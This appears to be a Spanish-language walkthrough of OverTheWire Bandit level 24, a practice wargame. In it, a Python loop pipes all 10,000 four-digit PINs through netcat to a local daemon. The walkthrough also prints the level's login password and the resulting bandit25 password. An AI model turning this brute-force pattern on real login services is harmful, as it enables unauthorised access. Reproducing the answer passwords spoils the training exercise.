## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
## Datos de acceso al nivel
bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
## Solución
```
bandit24@bandit:/tmp/codigo$ touch codigos.py
bandit24@bandit:/tmp/codigo$ nano codigos.py

#!/usr/bin/python3

pw = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"

for codigo in range(0,10000):
        print(pw+" "+str(codigo).zfill(4))


bandit24@bandit:/tmp/codigo$ chmod +x codigos.py
bandit24@bandit:/tmp/codigo$ ./codigos.py | nc localhost 30002

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.

...

Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
```
## Notas adicionales

## Referencias